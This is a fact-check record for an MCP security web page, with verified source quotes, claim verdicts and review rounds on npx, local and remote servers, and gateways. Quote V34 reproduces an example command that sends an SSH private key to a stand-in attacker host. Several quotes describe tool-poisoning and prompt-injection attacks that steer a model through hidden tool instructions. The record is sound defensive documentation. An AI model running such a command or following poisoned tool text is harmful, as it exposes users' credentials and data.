# MCP Security page: fact check

Page: `mcp-security.html`. Checked 26 November 2026.

## Quotes

The page shows no quotes, at the owner's request. They are kept here. Run this to find each one word for word on its source page:

```
python3 -I scripts/check-evidence-quotes.py <cache-dir> mcp_security_evidence mcp-security.html
```

<!-- Begin source quotes -->
| ID | Quote | Source | Verdict |
|----|-------|--------|---------|
| <a id="ev-V1"></a>V1 | This command allows you to run an arbitrary command from an npm package (either one installed locally, or fetched remotely) | [npm Docs, npx](https://docs.npmjs.com/cli/v11/commands/npx#:~:text=This%20command%20allows%20you%20to%20run) | VERIFIED |
| <a id="ev-V2"></a>V2 | Local MCP servers are trusted like any other software you install. | [MCP security policy](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/SECURITY.md#trust-model) | VERIFIED |
| <a id="ev-V3"></a>V3 | When you run a local MCP server, you are trusting it with the same level of access as any other application or package on your system. | [MCP security policy](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/SECURITY.md#trust-model) | VERIFIED |
| <a id="ev-V4"></a>V4 | Local MCP servers are binaries that are downloaded and executed on the same machine as the MCP client. | [MCP security best practices](https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices#local-mcp-server-compromise) | VERIFIED |
| <a id="ev-V5"></a>V5 | Attackers can execute any command with MCP client privileges. | [MCP security best practices](https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices#local-mcp-server-compromise) | VERIFIED |
| <a id="ev-V6"></a>V6 | Execute MCP server commands in a sandboxed environment with minimal default privileges | [MCP security best practices](https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices#local-mcp-server-compromise) | VERIFIED |
| <a id="ev-V7"></a>V7 | the SDK’s stdio transport is not a sandbox. | [MCP security policy](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/SECURITY.md#stdio-transport-trust-boundary) | VERIFIED |
| <a id="ev-V8"></a>V8 | Dependency install scripts are blocked by default. | [npm Docs, npm approve-scripts](https://docs.npmjs.com/cli/v12/commands/npm-approve-scripts#:~:text=Dependency%20install%20scripts%20are%20blocked%20by) | VERIFIED |
| <a id="ev-V9"></a>V9 | Apply sandboxing to MCP servers launched or managed for the session when sandboxing is enabled. | [VS Code Docs, AI settings: chat.agent.sandbox.mcpServers](https://code.visualstudio.com/docs/agents/reference/ai-settings#_sandboxing-and-network-access) | VERIFIED. Copilot harness only; sandboxing is off by default and the MCP setting defaults to on. macOS 15 or later, or Linux and WSL2 with extra packages; Windows 11 support is experimental. Servers started on their own are not covered |
| <a id="ev-V10"></a>V10 | A Tool Poisoning Attack occurs when malicious instructions are embedded within MCP tool descriptions that are invisible to users but visible to AI models. | [Invariant Labs, tool poisoning attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks#:~:text=A%20Tool%20Poisoning%20Attack%20occurs%20when) | VERIFIED |
| <a id="ev-V11"></a>V11 | a malicious server can change the tool description after the client has already approved it. | [Invariant Labs, tool poisoning attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks#:~:text=a%20malicious%20server%20can%20change%20the) | VERIFIED |
| <a id="ev-V12"></a>V12 | a malicious server can poison tool descriptions to exfiltrate data accessible through other trusted servers | [Invariant Labs, tool poisoning attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks#:~:text=a%20malicious%20server%20can%20poison%20tool) | VERIFIED |
| <a id="ev-V13"></a>V13 | newline-delimited messages over the standard streams of a client-launched subprocess. | [MCP specification, transports](https://modelcontextprotocol.io/specification/latest/basic/transports#:~:text=newline%2Ddelimited%20messages%20over%20the%20standard%20streams) | VERIFIED |
| <a id="ev-V14"></a>V14 | each message is an HTTP POST to a single MCP endpoint | [MCP specification, transports](https://modelcontextprotocol.io/specification/latest/basic/transports#:~:text=each%20message%20is%20an%20HTTP%20POST) | VERIFIED |
| <a id="ev-V15"></a>V15 | Authorization is OPTIONAL for MCP implementations. | [MCP specification, authorization](https://modelcontextprotocol.io/specification/latest/basic/authorization#:~:text=Authorization%20is%20OPTIONAL%20for%20MCP%20implementations.) | VERIFIED |
| <a id="ev-V16"></a>V16 | Because models are designed to follow natural-language instructions, prompt injection attacks are both powerful and subtle. | [OWASP MCP Top 10 (beta)](https://owasp.org/www-project-mcp-top-10/#:~:text=Because%20models%20are%20designed%20to%20follow) | VERIFIED |
| <a id="ev-V17"></a>V17 | mcp-remote is exposed to OS command injection when connecting to untrusted MCP servers | [CVE-2025-6514, fixed in mcp-remote 0.1.16](https://github.com/advisories/GHSA-6xpm-ggf7-wc3p#:~:text=mcp%2Dremote%20is%20exposed%20to%20OS%20command) | VERIFIED |
| <a id="ev-V18"></a>V18 | both run with equivalent environment-level privilege | [MCP security policy](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/SECURITY.md#stdio-transport-trust-boundary) | VERIFIED |
| <a id="ev-V19"></a>V19 | In the current release, this field is advisory: install scripts still run by default | [npm Docs, npm 11 approve-scripts](https://docs.npmjs.com/cli/v11/commands/npm-approve-scripts#:~:text=In%20the%20current%20release%2C%20this%20field) | VERIFIED |
| <a id="ev-V20"></a>V20 | Without these protections, attackers could use DNS rebinding to interact with local MCP servers from remote websites. | [MCP specification, Streamable HTTP](https://modelcontextprotocol.io/specification/latest/basic/transports/streamable-http#:~:text=Without%20these%20protections%2C%20attackers%20could) | VERIFIED |
| <a id="ev-V21"></a>V21 | An attacker includes a malicious "startup" command in a client configuration | [MCP security best practices](https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices#local-mcp-server-compromise) | VERIFIED |
| <a id="ev-V22"></a>V22 | OAuth authorization URLs provided by malicious MCP servers can exploit client-side URL handling vulnerabilities, leading to Cross-Site Scripting (XSS) attacks and Remote Code Execution (RCE). | [MCP security best practices](https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices#oauth-authorization-url-validation) | VERIFIED |
| <a id="ev-V23"></a>V23 | If looking in the npx cache check if a newer version is available | [npm CLI source, libnpmexec 12.2.3](https://github.com/npm/cli/blob/v12.2.3/workspaces/libnpmexec/lib/index.js#L42-L45) | VERIFIED |
| <a id="ev-V24"></a>V24 | which servers can provide specific types of functionality (tools, resources, prompts) | [MCP architecture overview](https://modelcontextprotocol.io/docs/learn/architecture#:~:text=which%20servers%20can%20provide%20specific%20types) | VERIFIED |
| <a id="ev-V25"></a>V25 | Connect an MCP Client that only supports local (stdio) servers to a Remote MCP Server, with auth support | [mcp-remote README](https://github.com/punkpeye/mcp-remote#readme) | VERIFIED |
| <a id="ev-V26"></a>V26 | MCP (Model Context Protocol) is an open-source standard for connecting AI applications to external systems. | [MCP introduction](https://modelcontextprotocol.io/docs/getting-started/intro#:~:text=MCP%20%28Model%20Context%20Protocol%29%20is%20an) | VERIFIED |
| <a id="ev-V27"></a>V27 | A program that provides context to MCP clients | [MCP architecture overview](https://modelcontextprotocol.io/docs/learn/architecture#:~:text=A%20program%20that%20provides%20context) | VERIFIED |
| <a id="ev-V28"></a>V28 | Executable functions that AI applications can invoke to perform actions | [MCP architecture overview](https://modelcontextprotocol.io/docs/learn/architecture#:~:text=Executable%20functions%20that%20AI%20applications) | VERIFIED |
| <a id="ev-V29"></a>V29 | Data sources that provide contextual information to AI applications | [MCP architecture overview](https://modelcontextprotocol.io/docs/learn/architecture#:~:text=Data%20sources%20that%20provide%20contextual) | VERIFIED |
| <a id="ev-V30"></a>V30 | Reusable templates that help structure interactions with language models | [MCP architecture overview](https://modelcontextprotocol.io/docs/learn/architecture#:~:text=Reusable%20templates%20that%20help%20structure) | VERIFIED |
| <a id="ev-V31"></a>V31 | MCP servers can execute locally or remotely. | [MCP architecture overview](https://modelcontextprotocol.io/docs/learn/architecture#:~:text=MCP%20servers%20can%20execute%20locally) | VERIFIED |
| <a id="ev-V32"></a>V32 | a malicious server already has arbitrary code execution by virtue of being run | [MCP security policy](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/SECURITY.md#stdio-transport-trust-boundary) | VERIFIED |
| <a id="ev-V33"></a>V33 | Local MCP servers running with full host access, enabling file system traversal, credential theft, or arbitrary code execution. | [OWASP MCP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html#key-risks) | VERIFIED |
| <a id="ev-V34"></a>V34 | npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location | [MCP security best practices, example startup command](https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices#local-mcp-server-compromise) | VERIFIED |
| <a id="ev-V35"></a>V35 | deployed malware that scanned the environment for sensitive credentials. | [CISA alert, npm supply chain compromise](https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem) | VERIFIED |
| <a id="ev-V36"></a>V36 | Exfiltrated the harvested credentials to an endpoint controlled by the actor. | [CISA alert, npm supply chain compromise](https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem) | VERIFIED |
| <a id="ev-V37"></a>V37 | Attackers can install malware, create backdoors, or modify system configurations for persistent access. | [MCP security best practices, OAuth URL attack risks](https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices#oauth-authorization-url-validation) | VERIFIED |
| <a id="ev-V38"></a>V38 | Attackers use prompt injection to encode sensitive data into seemingly normal tool calls | [OWASP MCP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html#key-risks) | VERIFIED |
| <a id="ev-V39"></a>V39 | The MCP server executes actions with its own (often broad) privileges, not the requesting user's permissions. | [OWASP MCP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html#key-risks) | VERIFIED |
| <a id="ev-V40"></a>V40 | Malicious instructions hidden in tool descriptions, parameter schemas, or return values that manipulate the LLM's behavior. | [OWASP MCP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html#key-risks) | VERIFIED |
| <a id="ev-V41"></a>V41 | MCP lets LLMs decide which tools to invoke, when, and with what parameters. | [OWASP MCP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html#introduction) | VERIFIED |
| <a id="ev-V42"></a>V42 | The code run inherits all the privileges of the execution user. | [Node.js security policy](https://github.com/nodejs/node/blob/main/SECURITY.md#:~:text=The%20code%20run%20inherits%20all%20the) | VERIFIED |
| <a id="ev-V43"></a>V43 | Node.js trusts any code it is asked to run. | [Node.js Docs, permissions](https://nodejs.org/api/permissions.html#:~:text=Node.js%20trusts%20any%20code%20it%20is) | VERIFIED |
| <a id="ev-V44"></a>V44 | This command installs a package and any packages that it depends on. | [npm Docs, npm install](https://docs.npmjs.com/cli/v11/commands/npm-install#:~:text=This%20command%20installs%20a%20package%20and) | VERIFIED |
| <a id="ev-V45"></a>V45 | attackers also try to add malicious behavior to existing popular packages. | [npm Docs, threats and mitigations](https://docs.npmjs.com/threats-and-mitigations#:~:text=attackers%20also%20try%20to%20add%20malicious) | VERIFIED |
| <a id="ev-V46"></a>V46 | A compromised dependency can alter agent behavior or introduce execution-level backdoors. | [OWASP MCP Top 10](https://owasp.org/www-project-mcp-top-10/#:~:text=A%20compromised%20dependency%20can%20alter%20agent) | VERIFIED |
| <a id="ev-V47"></a>V47 | the language model can discover and invoke tools automatically based on its contextual understanding and the user's prompts. | [MCP specification, tools](https://modelcontextprotocol.io/specification/latest/server/tools#:~:text=the%20language%20model%20can%20discover%20and) | VERIFIED |
| <a id="ev-V48"></a>V48 | MCP introduces a fundamentally new attack surface: AI agents dynamically executing tools based on natural language, with access to sensitive systems. | [OWASP MCP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html#:~:text=MCP%20introduces%20a%20fundamentally%20new%20attack) | VERIFIED |
| <a id="ev-V49"></a>V49 | Remote MCP servers function similarly to local MCP servers but are hosted on the internet rather than your local machine. | [MCP Docs, connect to remote servers](https://modelcontextprotocol.io/docs/develop/connect-remote-servers#:~:text=Remote%20MCP%20servers%20function%20similarly%20to) | VERIFIED |
| <a id="ev-V50"></a>V50 | Unlike local servers that require installation and configuration on each device, remote servers are available from any MCP client with an internet connection. | [MCP Docs, connect to remote servers](https://modelcontextprotocol.io/docs/develop/connect-remote-servers#:~:text=Unlike%20local%20servers%20that%20require%20installation) | VERIFIED |
| <a id="ev-V51"></a>V51 | Only remote HTTP MCP servers are supported. | [Cloudflare Docs, MCP server portals](https://developers.cloudflare.com/cloudflare-one/access-controls/ai-controls/mcp-portals/#:~:text=Only%20remote%20HTTP%20MCP%20servers%20are) | VERIFIED |
| <a id="ev-V52"></a>V52 | Only remote MCP servers are inspected. Local MCP servers that run on a device aren't visible to Global Secure Access. | [Microsoft Learn, Global Secure Access MCP firewall](https://learn.microsoft.com/en-us/entra/global-secure-access/how-to-configure-mcp-firewall#:~:text=Only%20remote%20MCP%20servers%20are%20inspected.) | VERIFIED |
<!-- End source quotes -->

## Claims

| Page claim | Evidence | Verdict |
|------------|----------|---------|
| npx handles an npm-based MCP server like any other npm package: it uses a copy on the machine or downloads one, then runs it | V1, V4, V23 | Removed from the page on 26 November 2026. Was: VERIFIED. V1 covers any command from an npm package |
| npx uses a copy on the machine or downloads one, possibly a newer release; with only a cached copy, a bare name can pick up a newer release | V1, V23; [lines 41 to 86](https://github.com/npm/cli/blob/v12.2.3/workspaces/libnpmexec/lib/index.js#L41-L86) and the round 2 test: with only a cached copy, a bare name, a tag such as `@latest` and a range such as `^1.0.0` can pick up a newer release, while an exact version and `@*` kept the cached one | VERIFIED. Tested on npm 11.20.0 and 12.2.3, macOS, with dummy packages on a local registry |
| MCP is a set of rules that lets an AI app use other programs, called MCP servers | V26, V27 | VERIFIED, in plain words |
| A server can give the app tools, resources and prompts | V24, V28, V29, V30 | VERIFIED. The examples (search the web, a file) are illustrations in plain words |
| A server runs on your computer or on another one | V31 | VERIFIED |
| The MCP SDK's stdio connection to a local server is not a sandbox | V7 | Removed from the page on 26 November 2026. Was: VERIFIED for the SDK stdio transport |
| Once running, a local MCP server exposes tools, resources or prompts to an AI client over MCP (figure) | V24, V27 | VERIFIED |
| A malicious server runs code just by being run, without any tool call | V2, V3, V32 | VERIFIED as documented. Not tested |
| Read local files, source code and configuration files | V33, V34 | VERIFIED as a documented risk. Not tested |
| Access available environment variables, API tokens and cloud credentials | V33, V35; the alert names API keys for AWS, Google Cloud and Azure | VERIFIED. V35 describes a malicious npm package, not an MCP server |
| Make outbound connections and exfiltrate sensitive information | V34, V36 | VERIFIED. V36 describes a malicious npm package |
| Execute other applications and commands | V5, V32 | VERIFIED as a documented risk |
| Modify files and establish persistence | V37 | VERIFIED as a documented risk of code execution reached through a malicious server's OAuth URL |
| Heading and sentence under the table: MCP adds AI risks on top of npm package risks | V41, V48 | VERIFIED |
| Table: supply chain and transitive dependency risk, both columns | V44, V45, V46 | VERIFIED. A local npm-based server is an npm package (V4, V1) |
| Table: arbitrary code execution and access to local credentials, both columns | V1, V3, V32, V35, V42 | VERIFIED |
| Table: no built-in sandboxing, both columns | V7, V43, V42 | VERIFIED for Node.js, npx and the MCP SDK. Node.js has an opt-in permission model that does not protect against malicious code, and some clients offer a sandbox that must be turned on (V9) |
| Table: MCP column, tool poisoning, AI-driven tool invocation, cross-MCP manipulation | V10, V11, V12, V41, V47 | VERIFIED as documented. Not tested |
| Table: npm column, "Not applicable" and "Not inherent" for the three MCP rows | V10, V12, V1 | Follows from the definitions: these risks are defined by MCP tool descriptions and model-chosen tool calls, which a plain npm package does not have |
| No sandbox by default from npm or MCP | V9 shows a client sandbox that must be turned on | Removed from the page on 26 November 2026. Was: `[inference]`. Other clients and Node's permission model were not reviewed |
| npm 12 blocks dependency install scripts by default | V8 | Removed from the page on 26 November 2026. Was: VERIFIED. How this applies to the package that npx itself runs was not checked; the page says only "dependency" |
| npm 11, bundled with Node.js 24 and 26, still runs them | V19; [Node.js release index](https://nodejs.org/dist/index.json), read 26 November 2026: v24.22.3 ships npm 11.19.1, v26.13.1 ships npm 11.20.0 | Removed from the page on 26 November 2026. Was: VERIFIED |
| A local client and server share privileges unless the server is isolated | V18 (stated for the stdio transport) | VERIFIED |
| A local HTTP server left unprotected can be reached from a remote website through DNS rebinding | V20 | Removed from the page on 26 November 2026. Was: VERIFIED as a documented attack. Not observed |
| A client configuration file can carry a malicious startup command | V21 | Removed from the page on 26 November 2026. Was: VERIFIED as a documented attack. Not observed |
| A local MCP server carries local code execution risk | V4, V5, V21 | VERIFIED as a documented risk. Not observed |
| A malicious remote server can attack a client flaw, for example through an OAuth authorization URL | V22 | Removed from the page on 26 November 2026. Was: VERIFIED as a documented attack. Not observed |
| Local and remote transports | V13, V14 | VERIFIED |
| Remote server code runs on another machine, so there is no direct local server execution | V49 | VERIFIED |
| A native remote connection is closer to consuming an API than to installing software | V14, V15 | Removed from the page on 26 November 2026. Was: `[inference]` |
| A remote server does not need installing on each device | V50 | VERIFIED |
| A remote server is still an MCP server, and OWASP names these four MCP risks | V31, V16, V38, V39, V40 | VERIFIED. The cheat sheet does not list risks per transport |
| A local bridge connects a stdio client to a remote server | V25 | VERIFIED for mcp-remote |
| A bridge is local software; mcp-remote had a command injection flaw | V25, V17; advisory range 0.0.5 up to but not including 0.1.16 | VERIFIED for mcp-remote. Not observed |
| An MCP gateway does not inherently stop npx; restricting MCP servers alone leaves the npx risk | Follows from where a gateway sits | Removed from the page on 26 November 2026. Was: `[inference]` |
| Some gateways cover only remote servers, so they do not govern local execution | V51, V52 | VERIFIED for Cloudflare MCP server portals and the Global Secure Access MCP firewall. Other gateways were not reviewed |
| Limit npx as well as MCP servers, because npx can run any command from an npm package | V1 | `[recommendation]`; the reason is VERIFIED |
| Two governance layers, principles, controls | V6 for sandboxing | `[recommendation]`, supplied by the owner's brief; not source claims |

## Gaps

- No MCP client or server was run or tested. Apart from the npx version test, the page rests on documentation, npm source and one advisory.
- The npx version test did not use the public npm registry; Windows, Linux and other npm versions were not tested.
- The Invariant Labs post is dated 1 April 2025.
- The OWASP MCP Top 10 page described itself as in beta.

## Review rounds

Each round, one reviewer persona reads the page against its sources and the brief. A different persona checks every deviation.

### Round 1, 26 November 2026

Verifier: senior application security architect.

| ID | Deviation raised | Verdict | Action |
|----|------------------|---------|--------|
| F1 | "It can do this without the AI invoking a tool" lacks the no-isolation condition | Rejected: "can" states ability, and the figure above states the condition | None |
| F2 | V7 quote dropped "the SDK's" and read wider than the source | Confirmed | Quote restored |
| F3 | "Both processes run locally unless separately isolated" is wrong: isolation does not move a process | Confirmed | Reworded, V18 |
| F4 | "External infrastructure" is not true of every remote server | Confirmed, minor | "Another machine" |
| F5 | npx does not always download | Confirmed | Flow, text description and V1 extended |
| F6 | Local HTTP servers and DNS rebinding missing | Confirmed | Sentence added, V20 |
| F7 | "AI-driven tool invocation: Not inherent" is unclear for npm | Rejected: the row is about tool invocation and the table is tagged inference | None |
| F8 | Two gateway statements are inferences without a tag | Confirmed | Tagged |
| F9 | OWASP list cited without its beta status | Confirmed | "(beta)" added |
| M1 | npm 12 sentence misleads: current Node.js releases bundle npm 11 | Confirmed | Sentence extended, V19 |
| M2 | V10 cut the sentence before "invisible to users" | Confirmed | Full sentence |
| M3 | Malicious startup commands in client configuration missing | Confirmed | Sentence added, V21 |
| M4 | Attacks from a remote server on the client missing | Confirmed | Sentence added, V22 |
| M5 | V9 omitted that sandboxing must be set | Confirmed | Quote extended |

### Round 2, 26 November 2026

Reviewer: software supply chain security engineer. Verifier: npm CLI expert.

| ID | Deviation raised | Verdict | Action |
|----|------------------|---------|--------|
| D1 | "Downloaded from the registry if not already on your machine" is false for a bare name with only a cached copy: npx runs a newer release | Confirmed by test; wording came from round 1 F5 | Flow, text description, one sentence, V23 |
| D2 | Two changes from the brief had no recorded reason | Confirmed as a gap in the notes; no reader misled | Recorded in the decisions file |

### Round 3, 26 November 2026

Reviewer: AI agent security researcher. Verifier: evidence and standards auditor.

| ID | Deviation raised | Verdict | Action |
|----|------------------|---------|--------|
| E1 | The npx claim row said the cache check applies to a bare name only; tags and ranges are affected too | Confirmed, low | Row corrected |
| E2 | The bridge verdict is a general statement without a tag, and the local verdict had no claim row | Confirmed, low | Tag, claim rows |
| E3 | "Tools, resources or prompts", "HTTPS" and the bridge path had no source | Confirmed, low | V24, V25; "HTTPS" changed to "Streamable HTTP" |
| E4 | Several sentences differ from the brief with no recorded reason | Confirmed, low | Wording restored where true; the rest recorded |

### Round 4, 26 November 2026

Reviewer: identity and protocol specialist. Verifier: VS Code docs and evidence auditor.

| ID | Deviation raised | Verdict | Action |
|----|------------------|---------|--------|
| F1 | The VS Code sandbox quote belongs to a deprecated configuration format, and nothing said so | Confirmed, low. No false statement on the page | V9 replaced with the current sandbox setting; conditions recorded |
| F2 | "An MCP gateway can help address the second" is only in the figure's text description | Partly, low. The figure draws the gateway in the governance column | Reason recorded in the decisions file |
| F3 | The figure's "tools, resources or prompts" claim had no quote beside it and no claim row | Confirmed, low | V24 moved beside the figure; claim row added |
